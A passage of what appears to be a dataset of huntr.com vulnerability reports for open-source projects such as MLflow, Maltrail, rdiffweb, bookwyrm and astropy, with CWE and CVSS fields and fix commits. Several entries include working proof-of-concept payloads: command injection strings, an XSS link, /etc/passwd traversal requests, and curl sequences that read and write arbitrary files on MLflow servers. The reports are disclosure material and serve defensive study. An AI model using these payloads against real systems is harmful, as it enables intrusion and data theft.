localhost'\n\n2023/04/30 11:51:07 INFO mlflow.models.flavor_backend_registry: Selected backend for flavor 'python_function'\n2023/04/30 11:51:07 INFO mlflow.utils.virtualenv: Installing python 3.10.6 if it does not exist\n2023/04/30 11:51:07 INFO mlflow.utils.virtualenv: Environment /home/ubuntu/.mlflow/envs/mlflow-ddb80e0d83ed2efe0135e5c6dbae17ed032c869b already exists\n2023/04/30 11:51:07 INFO mlflow.utils.environment: === Running command '['bash', '-c', 'source /home/ubuntu/.mlflow/envs/mlflow-ddb80e0d83ed2efe0135e5c6dbae17ed032c869b/bin/activate && python -c \"\"']'\n2023/04/30 11:51:07 INFO mlflow.utils.environment: === Running command '['bash', '-c', 'source /home/ubuntu/.mlflow/envs/mlflow-ddb80e0d83ed2efe0135e5c6dbae17ed032c869b/bin/activate && exec gunicorn --timeout=60 -b localhost & id & localhost:80 -w 1 ${GUNICORN_CMD_ARGS} -- mlflow.pyfunc.scoring_server.wsgi:app']'\n...\nuid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)\n...\nImpact\nAn attacker is able to execute arbitrary OS commands by injecting malicious input into the CLI arguments of the models predict action of a mlflow executable. This vulnerability can be leveraged to get a foothold on a vulnerable machine, or attempt a local privilege escalation if a limited way of executing mlflow executable is obtained."}, "https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/": {"cve": "", "cve_link": "", "cwe": "CWE-78: OS Command Injection", "cwe_link": "https://cwe.mitre.org/data/definitions/78.html", "severity_score": "Critical (10)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/stamparm/maltrail", "fix_commit": "https://www.github.com/stamparm/maltrail/commit/a299967318cc226c18a6a07d1be708e3f21edd39", "description": "Description\nMaltrail <= v0.54 is vulnerable to unauthenticated OS command injection during the login process.\nSummary\nThe subprocess.check_output function in mailtrail/core/http.py contains a command injection vulnerability in the params.get(\"username\")parameter.\nAn attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication.\nProof of Concept\ncurl 'http://hostname:8338/login' \\\n  --data 'username=;`id > /tmp/bbq`'\nImpact\nArbitrary command execution"}, "https://huntr.com/bounties/a17e7a9f-0fee-4130-a522-5a0466fc17c7/": {"cve": "CVE-2023-0777", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0777", "cwe": "CWE-305: Authentication Bypass by Primary Weakness", "cwe_link": "https://cwe.mitre.org/data/definitions/305.html", "severity_score": "High (8.6)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa", "fix_commit": "https://www.github.com/modoboa/modoboa/commit/47d17ac6643f870719691073956a26e4be0a4806", "description": "Description\nThe endpoint /api/v2/token/ allows an unauthorized user to perform brute-forcing and the app doesn't block the request which not having any SESSION COOKIE or even CSRF token\nRequest\nPOST /api/v2/token/ HTTP/1.1\nHost: demo.modoboa.org\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------25524418606542250161357131552\nContent-Length: 301\nUpgrade-Insecure-Requests: 1\nSec-Fetch-User: ?1\nSec-Gpc: 1\nTe: trailers\nConnection: close\n\n-----------------------------25524418606542250161357131552\nContent-Disposition: form-data; name=\"username\"\n\nadmin\n-----------------------------25524418606542250161357131552\nContent-Disposition: form-data; name=\"password\"\n\n{PASSWORD-HERE}\n-----------------------------25524418606542250161357131552--\nThis request returns 2 types of response codes.\n--> HTTP/1.1 401 Unauthorized ::  For Incorrect Password\n--> HTTP/1.1 200 OK   :: For Correct Password \nProof Of Concept\nImpact\nAdmin Take Over"}, "https://huntr.com/bounties/c62126dc-d9a6-4d3e-988d-967031876c58/": {"cve": "CVE-2022-4722", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-4722", "cwe": "CWE-305: Authentication Bypass by Primary Weakness", "cwe_link": "https://cwe.mitre.org/data/definitions/305.html", "severity_score": "High (7.2)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/d1aaa96b665a39fba9e98d6054a9de511ba0a837", "description": "Description\nThe username fields while creating a user Role is same which should not be the case, the username should be made unique.\nProof of Concept\n1. Login to Demo account at https://rdiffweb-demo.ikus-soft.com/login/\n2. Enter the username and password as admin: admin123 respectively.\n3. visit to https://rdiffweb-demo.ikus-soft.com/admin/users\n4. Click on \"Add user\" button\n5. Fill the form with your choice & use the same email every time to create more such users & also change the \"User Role\" each time you want till whatever you want.\n6. You will notice that there is a major flaw in user's permission access control where in \"username\" are considered as a primary key.\n7. Now add another user the same username but with capital letters in the combinations for same username, it will be addressed unique by the system & a new user Role with the same \"username\" word will be created.\nImpact\nThis is leading to primary key exploitation.\nThis is leading to broken authorization as a user was able to fool and create same username and fool the system which is leading to authorization bypass.\nIt may also cause confusion within the users & lead to more attacks on the system."}, "https://huntr.com/bounties/c29822be-1129-47be-9d89-47645c95efd6/": {"cve": "", "cve_link": "", "cwe": "CWE-305: Authentication Bypass by Primary Weakness", "cwe_link": "https://cwe.mitre.org/data/definitions/305.html", "severity_score": "High (8.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/c27c46bac656b1da74f28eac1b52dfa5df76e6f2", "description": "Description\nAn attacker is able to bypass 2FA due to a logic flaw on the application\nProof of Concept\n1) Go to https://rdiffweb-dev.ikus-soft.com/prefs/general\n2) Your account is set to abc@gmail.com as primary email\n3) Go to https://rdiffweb-dev.ikus-soft.com/prefs/mfa and click on \"Enable 2FA\"\n4) A confirmation code will be sent to your email\n5) Lets say the company admin has changed the email associated with the account. Session will still persist as session does not expire on email change .Now lets go back to https://rdiffweb-dev.ikus-soft.com/prefs/general and change the email\n6) Previous session still persists. Use the token in step 4 and enable 2FA \n7) 2FA is successfully enabled . \n\n\n\n# Impact\n\nDue to lack of code and email integration , old confirmation codes still remain valid on email change , hence allows attacker the misuse this to cause a 2FA bypass"}, "https://huntr.com/bounties/428eee94-f1a0-45d0-9e25-318641115550/": {"cve": "CVE-2022-2651", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2651", "cwe": "CWE-305: Authentication Bypass by Primary Weakness", "cwe_link": "https://cwe.mitre.org/data/definitions/305.html", "severity_score": "Critical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/7bbe42fb30a79a26115524d18b697d895563c92f", "description": "Hello maintainer, i noticed that there is no ratelimit protetcion on https://book.dansmonorage.blue/confirm-email endpoint, so we can perform bruteforce attack\nSteps to reproduce:\nCreate a acount with victims email id\nWhen the account is created, its ask for email confirmation via validating OTP on https://book.dansmonorage.blue/confirm-email\nEnter any random OTP and try to perfrom bruteforce attack\nPatch recommendation:\nAdd ratelimit protecion on POST confirmation email endpoints/parameters\nImpact\nPre-Account Takeover"}, "https://huntr.com/bounties/c183c24b-cd8d-456a-b7ad-737f4cb24e87/": {"cve": "", "cve_link": "", "cwe": "CWE-20: Improper Input Validation", "cwe_link": "https://cwe.mitre.org/data/definitions/20.html", "severity_score": "High (7.8)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/astropy/astropy", "fix_commit": "https://www.github.com/astropy/astropy/commit/53188c39a23c33b72df5850ec59e31886f84e29d", "description": "Description\nDue to improper input validation a malicious user can provide a command or a script file as a value to savelayout argument, which will be placed as the first value in a list of arguments passed to subprocess.Popen. Although an error will be raised, the command or script will be executed successfully.\nProof of Concept\n$ cat /tmp/script\n#!/bin/bash\necho astrorce > /tmp/poc.txt\n$ python3\nPython 3.9.2 (default, Feb 28 2021, 17:03:44) \n[GCC 10.2.1 20210110] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> from astropy.coordinates.transformations import TransformGraph\n>>> tg = TransformGraph()\n>>> tg.to_dot_graph(savefn=\"/tmp/1.txt\", savelayout=\"/tmp/script\")\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/home/u32i/.local/lib/python3.9/site-packages/astropy/coordinates/transformations.py\", line 584, in to_dot_graph\n    stdout, stderr = proc.communicate(dotgraph)\n  File \"/usr/lib/python3.9/subprocess.py\", line 1134, in communicate\n    stdout, stderr = self._communicate(input, endtime, timeout)\n  File \"/usr/lib/python3.9/subprocess.py\", line 1961, in _communicate\n    input_view = memoryview(self._input)\nTypeError: memoryview: a bytes-like object is required, not 'str'\n>>> \n$ cat /tmp/poc.txt\nastrorce\nImpact\nA malicious user will we able to execute commands on the user's machine."}, "https://huntr.com/bounties/7d9332d8-6997-483b-9fb9-bcf2ae01dad4/": {"cve": "CVE-2023-0434", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0434", "cwe": "CWE-20: Improper Input Validation", "cwe_link": "https://cwe.mitre.org/data/definitions/20.html", "severity_score": "Medium (5.4)\nAttack vector\nPhysical\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pyload/pyload", "fix_commit": "https://www.github.com/pyload/pyload/commit/a2b1eb1028f45ac58dea5f58593c1d3db2b4a104", "description": "Description\nIf you give the string input in the Start/End time field, then the application will stop working.\nProof of Concept\nGo to \"Settings->General-Reconnection\"\nChange activated to \"on\"\nOn every input fields place any string for example put: \"test\"\nClick on save and refresh\nThe application will crash\nFix: rm ~/.pyload/settings/pyload.cfg or editing pyload.cfg.\nImpact\nWe can crash the application. Changing it with CSRF could lead to leveraging more paths to launch this attack."}, "https://huntr.com/bounties/59bda914-2cb0-4bcd-be88-d2c27e5a1e3f/": {"cve": "", "cve_link": "", "cwe": "CWE-20: Improper Input Validation", "cwe_link": "https://cwe.mitre.org/data/definitions/20.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/fe33fdcf564a6a5667aef75d5456bea08feab50d", "description": "Description\nThe link input validation is not filtered protocol javascript of href attribute. It allows attackers to inject malicious links to many fields of the website, such as author introduction, user summary, and book description, ... which could execute javascript code (XSS).\nProof of Concept\nEdit a book description or any fields allow link with the following input:\n<a href=\"javascript:alert('Pwned')\"> Click here to get FREE access </a>\nWhen a user clicks on the link, the \"Pwned\" box will pop up.\nLink video PoC\nImpact\nAccording to OWASP:\nXSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. The most severe XSS attacks involve disclosure of the user\u2019s session cookie, allowing an attacker to hijack the user\u2019s session and take over the account. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirect the user to some other page or site, or modify presentation of content. An XSS vulnerability allowing an attacker to modify a press release or news item could affect a company\u2019s stock price or lessen consumer confidence. An XSS vulnerability on a pharmaceutical site could allow an attacker to modify dosage information resulting in an overdose."}, "https://huntr.com/bounties/4be5fd63-8a0a-490d-9ee1-f33dc768ed76/": {"cve": "CVE-2023-3765", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-3765", "cwe": "CWE-36: Absolute Path Traversal", "cwe_link": "https://cwe.mitre.org/data/definitions/36.html", "severity_score": "Critical (10)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/0f2ad0236e355b0816a06670eccf69f57551fa2d", "description": "Description\nvalidate_path_is_safe() function in file /mlflow/server/handlers.py, introduced in PR #7891 on Feb 24th, 2023 does not account for Windows absolute path format, and thus can be bypassed on MLFlow servers, running on Windows hosts, exposing them to a number of high-impact directory traversals.\nThe code of the affected validate_path_is_safe() can be seen below:\n_OS_ALT_SEPS = [sep for sep in [os.sep, os.path.altsep] if sep is not None and sep != \"/\"]\n\n\ndef validate_path_is_safe(path):\n    \"\"\"\n    Validates that the specified path is safe to join with a trusted prefix. This is a security\n    measure to prevent path traversal attacks.\n    \"\"\"\n    if (\n        any((s in path) for s in _OS_ALT_SEPS)\n        or \"..\" in path.split(posixpath.sep)\n        or posixpath.isabs(path)\n    ):\n        raise MlflowException(f\"Invalid path: {path}\", error_code=INVALID_PARAMETER_VALUE)\nThe function implements 3 separate checks:\npath must not contain separators other than forward slash (/): any((s in path) for s in _OS_ALT_SEPS)\npath must not contain relative parent directory meta symbols (..): \"..\" in path.split(posixpath.sep)\npath must not be an absolute posix path: posixpath.isabs(path)\nBy supplying an absolute Windows path with forward slash (/) separators, all the above checks can be effectively bypassed:\n# Python 3.9.6 on Windows 10 Pro x64 Build 19045 \n>>> import os\n>>> import posixpath\n>>> test_path = 'C:/some/abs/path'\n>>>\n>>> _OS_ALT_SEPS = [sep for sep in [os.sep, os.path.altsep] if sep is not None and sep != \"/\"]\n>>>\n>>> any((s in test_path) for s in _OS_ALT_SEPS)\nFalse\n>>> \"..\" in test_path.split(posixpath.sep)\nFalse\n>>> posixpath.isabs(test_path)\nFalse\nConsequently, the attacker is able to perform directory traversals in any request handlers that use the validate_path_is_safe() to validate the user-supplied paths.\nThe validate_path_is_safe() function is used by 7 separate endpoints in mlflow/server/handlers.py file and allows the attacker to perform these actions:\nList files in directory:\n_list_artifacts()#910 mapped to GET /ajax-api/2.0/mlflow/artifacts/list\n_list_artifacts_mlflow_artifacts()#1707 mapped to GET /ajax-api/2.0/mlflow-artifacts/artifacts\nDownload arbitrary file:\nget_artifact_handler()#545 mapped to GET /get-artifact\n_download_artifact()#1655 mapped to GET /ajax-api/2.0/mlflow-artifacts/artifacts/PATH\nget_model_version_artifact_handler()#1429 mapped to GET /model-versions/get-artifact\nWrite arbitrary file:\n_upload_artifact()#1680 mapped to PUT /ajax-api/2.0/mlflow-artifacts/artifacts/PATH\nDelete arbitrary file:\n_delete_artifact_mlflow_artifacts()#1731 mapped to DELETE /ajax-api/2.0/mlflow-artifacts/artifacts\nThe combination of the above actions essentially gives an attacker full control over the server's file system, and allows to compromise confidentiality, integrity and availability of the user data, contained within the MLFlow server.\nProof of Concept\nSetup\nOn Windows\nPrerequisites: Installed Python3 on the PC\nInstall latest version of mlflow:\nC:\\Temp> pip install mlflow\nClone the mlflow repository into a local directory:\nC:\\Temp> git clone https://github.com/mlflow/mlflow\nRun one of the example mlflow scripts, e.g. examples/shap/explainer_logging.py to populate the mlruns directory:\nC:\\Temp\\> cd C:\\Temp\\mlflow\\examples\\shap\nC:\\Temp\\mlflow\\examples\\shap> pip install scikit-learn shap matplotlib\nC:\\Temp\\mlflow\\examples\\shap> python explainer_logging.py\nRun the server on Windows machine, expose it to all network interfaces:\nC:\\Temp\\mlflow\\examples\\shap> mlflow server --host 0.0.0.0\nOn Linux\nGiven that the Windows machine's external IP address is 10.0.0.1\n$ export MLFLOW_SERVER_IP=10.0.0.1\nList the existing runs in the MLFlow server. Use \"experiment_ids\": [\"0\"] to get the default experiment. Save run_uuid value for later use:\n# CURL request:\ncurl -X 'POST' -H 'Content-Type: application/json' -d '{\"experiment_ids\": [\"0\"]}'  \"http://$MLFLOW_SERVER_IP:5000/ajax-api/2.0/mlflow/runs/search\"\n\n# Response:\n{\n  \"runs\": [\n    {\n      \"info\": {\n        \"run_uuid\": \"POC_RUN_ID\",\n        ...\n      }\n    }\n  ]\n}\nCreate new model:\n# CURL request:\ncurl -X 'POST' -H 'Content-Type: application/json' -d '{\"name\":\"POC_MODEL_NAME\"}' \"http://$MLFLOW_SERVER_IP:5000/ajax-api/2.0/mlflow/registered-models/create\"\nCreate new model version by suppying the previously obtained run ID:\n# CURL request:\ncurl -X 'POST' -H 'Content-Type: application/json' -d '{\"name\":\"POC_MODEL_NAME\",\"source\":\"runs:/POC_RUN_ID\"}' \"http://$MLFLOW_SERVER_IP:5000/ajax-api/2.0/mlflow/model-versions/create\"\nExploitation\nUse the obtained IDs to trigger the following LFI actions:\nList files (path value is set to \"C:/\" in the examples below):\nRequest to /ajax-api/2.0/mlflow/artifacts/list:\n# CURL request:\ncurl -X 'GET' \"http://$MLFLOW_SERVER_IP:5000/ajax-api/2.0/mlflow/artifacts/list?run_uuid=POC_RUN_ID&path=C:/\"\n\n# Response:\n{\n    \"root_uri\": \"file:///C:/Users/Strawberry/Desktop/projects/mlflow/examples/shap/mlruns/0/POC_RUN_ID/artifacts\",\n    \"files\": [\n        {\n        \"path\": \"../../../../../../../../../..\",\n        \"is_dir\": true\n        },\n        {\n        \"path\": \"../../../../../../../../../../../Program Files\",\n        \"is_dir\": true\n        },\n        {\n        \"path\": \"../../../../../../../../../../../Windows\",\n        \"is_dir\": true\n        },\n        ...\n    ]\n}\nRequest to /ajax-api/2.0/mlflow-artifacts/artifacts:\n# CURL request:\ncurl -X 'GET' \"http://$MLFLOW_SERVER_IP:5000/ajax-api/2.0/mlflow-artifacts/artifacts?path=C:/\"\n\n# Response:\n{\n    \"files\": [\n        {\n        \"path\": \"..\",\n        \"is_dir\": true\n        },\n        ...\n        {\n        \"path\": \"Program Files\",\n        \"is_dir\": true\n        },\n        {\n        \"path\": \"Program Files (x86)\",\n        \"is_dir\": true\n        },\n        {\n        \"path\": \"ProgramData\",\n        \"is_dir\": true\n        },\n        {\n        \"path\": \"Recovery\",\n        \"is_dir\": true\n        },\n        {\n        \"path\": \"System Volume Information\",\n        \"is_dir\": true\n        }\n    ]\n}\nWrite file (path value is set to \"C:/temp/poc.txt\" in the examples below):\nRequest to /ajax-api/2.0/mlflow-artifacts/artifacts/PATH:\n# CURL request:\ncurl -X 'PUT' -d 'this is write poc' \"http://$MLFLOW_SERVER_IP:5000/ajax-api/2.0/mlflow-artifacts/artifacts/C:/temp/poc.txt\"\n\n# Response:\n{}\nRead file (path value is set to \"C:/temp/poc.txt\" in the examples below):\nRequest to /get-artifact:\n# CURL request:\ncurl -X 'GET' \"http://$MLFLOW_SERVER_IP:5000/get-artifact?path=C:/temp/poc.txt&run_uuid=POC_RUN_ID\"\n\n# Response:\nthis is write poc\nRequest to /ajax-api/2.0/mlflow-artifacts/artifacts/PATH. Could not be reproduced, gives the following error:\n# CURL request:\ncurl -X 'GET' \"http://$MLFLOW_SERVER_IP:5000/ajax-api/2.0/mlflow-artifacts/artifacts/C:/temp/poc.txt\"\n\n# Response:\n{\"error_code\": \"INTERNAL_ERROR\", \"message\": \"The following failures occurred while downloading one or more artifacts from ./mlartifacts: {'C:/temp/poc.txt': 'SameFileError(\\\"\\\\'C:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\temp\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\poc.txt\\\\' and \\\\'C:/temp/poc.txt\\\\' are the same file\\\")'}\"}\nRequest to /model-versions/get-artifact:\n# CURL request:\ncurl -X 'GET' \"http://$MLFLOW_SERVER_IP:5000/model-versions/get-artifact?path=C:/Temp/poc.txt&run_uuid=POC_RUN_ID&name=POC_MODEL_NAME&version=1\"\n\n# Response:\nthis is write poc\nDelete file (path value is set to \"C:/temp/poc.txt\" in the examples below):\nRequest to /ajax-api/2.0/mlflow-artifacts/artifacts. Could not be reproduced, gives the following error:\n# CURL request:\ncurl -X 'DELETE' \"http://$MLFLOW_SERVER_IP:5000/ajax-api/2.0/mlflow-artifacts/artifacts?path=C:/temp/poc.txt\"\n\n# Response:\n<!doctype html>\n<html lang=en>\n<title>405 Method Not Allowed</title>\n<h1>Method Not Allowed</h1>\n<p>The method is not allowed for the requested URL.</p>\nImpact\nFlawed path validation middleware can be abused by an attacker to bypass existing security controls on Windows hosts, and essentially achieve full control over the underlying host's filesystem through a number of directory traversals that allow listing, reading, writing, and deleting files using absolute Windows file paths.\nThe full control over the filesystem can be leveraged by an attacker to compromise confidentiality, integrity, and availability of the MLFlow user data, present on the vulnerable machine."}, "https://huntr.com/bounties/ae92f814-6a08-435c-8445-eec0ef4f1085/": {"cve": "CVE-2023-1176", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-1176", "cwe": "CWE-36: Absolute Path Traversal", "cwe_link": "https://cwe.mitre.org/data/definitions/36.html", "severity_score": "Medium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/63ef72aa4334a6473ce7f889573c92fcae0b3c0d", "description": "Description\nA blind LFI exists in /ajax-api/2.0/mlflow/registered-models/get?name=\nThe response from the server is different depending on if the file exists on the local file system or not. When the arbitrary local file exists, the server responds with 500 INTERNAL SERVER ERROR and when it doesn't exist it returns a 404 NOT FOUND response.\nProof of Concept\nGET /ajax-api/2.0/mlflow/registered-models/get?name=../../../../../../../../../etc/passwd HTTP/1.1\nReturns 500 INTERNAL SERVER ERROR because /etc/passwd exists in the server.\nGET /ajax-api/2.0/mlflow/registered-models/get?name=../../../../../../../../../etc/doesNotExist\nReturns 404 NOT FOUND because /etc/doesNotExist isn't a file on the local filesystem.\nImpact\nAllows attackers to enumerate files and services on the local operating system hosting the MLflow server."}, "https://huntr.com/bounties/7acac778-5ba4-4f02-99e2-e4e17a81e600/": {"cve": "CVE-2022-1554", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-1554", "cwe": "CWE-36: Absolute Path Traversal", "cwe_link": "https://cwe.mitre.org/data/definitions/36.html", "severity_score": "Medium (6.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/clinical-genomics/scout", "fix_commit": "https://www.github.com/clinical-genomics/scout/commit/952a2e2319af2d95d22b017a561730feac086ff1", "description": "A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with \u201cdot-dot-slash (../)\u201d sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control (such as in the case of locked or in-use files on the Microsoft Windows operating system).\nThis attack is also known as \u201cdot-dot-slash\u201d, \u201cdirectory traversal\u201d, \u201cdirectory climbing\u201d and \u201cbacktracking\u201d.\nRoot Cause Analysis\nPassing untrusted input to flask.send_filecan lead to path traversal attacks.\nProof of Concept\nThe bug can be verified using a proof of concept similar to the one shown below.\ncurl --path-as-is -i -s -k 'http://<domain>/remote/static/unindexed?file=/../../../../../../../../..//etc/passwd'\nThis bug was found using CodeQL by Github"}, "https://huntr.com/bounties/a3867b4e-6701-4418-8c20-3c6e7084a44a/": {"cve": "CVE-2023-2800", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-2800", "cwe": "CWE-377: Insecure Temporary File", "cwe_link": "https://cwe.mitre.org/data/definitions/377.html", "severity_score": "Medium (4.7)\nAttack vector\nLocal\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/huggingface/transformers", "fix_commit": "https://www.github.com/huggingface/transformers/commit/80ca92470938bbcc348e2d9cf4734c7c25cb1c43", "description": "Description\ntransformers package is using the deprecated function tempfile.mktemp() which is not secure. Because a different process may create a file with this name in the time between the call to mktemp() and the subsequent attempt to create the file by the first process.\nFunctions that create temporary file names (such as tempfile.mktemp()) are fundamentally insecure, as they do not ensure exclusive access to a file with the temporary name they return. The file name returned by these functions is guaranteed to be unique on creation but the file must be opened in a separate operation. There is no guarantee that the creation and open operations will happen atomically. This provides an opportunity for an attacker to interfere with the file before it is opened.\nUse mkstemp() instead of tempfile.mktemp().\nImpact\nAvailability will get affected because of this vulnerability."}, "https://huntr.com/bounties/7e50397b-dd63-4bb5-b56d-704094a7da45/": {"cve": "CVE-2022-0315", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-0315", "cwe": "CWE-377: Insecure Temporary File", "cwe_link": "https://cwe.mitre.org/data/definitions/377.html", "severity_score": "High (8.2)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/horovod/horovod", "fix_commit": "https://www.github.com/horovod/horovod/commit/b96ecae4dc69fc0a83c7c2d3f1dde600c20a1b41", "description": "Description\nhorovod package is using the deprecated function tempfile.mktemp() which is not secure. Because a different process may create a file with this name in the time between the call to mktemp() and the subsequent attempt to create the file by the first process.\nImpact\nAvailability will get affected because of this vulnerability.\nRemediation\nUse mkstemp() instead of tempfile.mktemp()"}, "https://huntr.com/bounties/e5384764-c583-4dec-a1d8-4697f4e12f75/": {"cve": "CVE-2022-0736", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-0736", "cwe": "CWE-377: Insecure Temporary File", "cwe_link": "https://cwe.mitre.org/data/definitions/377.html", "severity_score": "High (8.2)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/61984e6843d2e59235d82a580c529920cd8f3711", "description": "Description\nmlflow package is using the deprecated function tempfile.mktemp() which is not secure. Because a different process may create a file with this name in the time between the call to mktemp() and the subsequent attempt to create the file by the first process.\nImpact\nAvailability will get affected because of this vulnerability.\nRemediation\nUse mkstemp() instead of tempfile.mktemp()"}, "https://huntr.com/bounties/64f3ab93-1357-4468-8ff4-52bbcec18cca/": {"cve": "CVE-2023-0860", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0860", "cwe": "CWE-307: Improper Restriction of Excessive Authentication Attempts", "cwe_link": "https://cwe.mitre.org/data/definitions/307.html", "severity_score": "High (7.8)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa-installer", "fix_commit": "https://www.github.com/modoboa/modoboa-installer/commit/63d92b73f3da6971ae4e13d033d625773ac91085", "description": "Description\nModoboa does not restrict or limit unsuccessful login attempts allowing an attacker to brute force the password of a known user\nProof of Concept\nSteps to Reproduce:\nCapture login request with BurpSuite Send to Intruder Replay the login request with a different password value utilizing a password list payload Should the password exist a \"302 Found\" reason code will be issued Unsuccessfull attempts are returned with a \"401 Unauthorized\" reason BurpSuite will continute attempting all passwords in the password list until complete Request to be replayed:\nPOST /accounts/login/ HTTP/1.1\nHost: 127.0.0.1:8000\nContent-Length: 123\nCache-Control: max-age=0\nsec-ch-ua: \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Linux\"\nUpgrade-Insecure-Requests: 1\nOrigin: http://127.0.0.1:8000\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: http://127.0.0.1:8000/accounts/login/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: 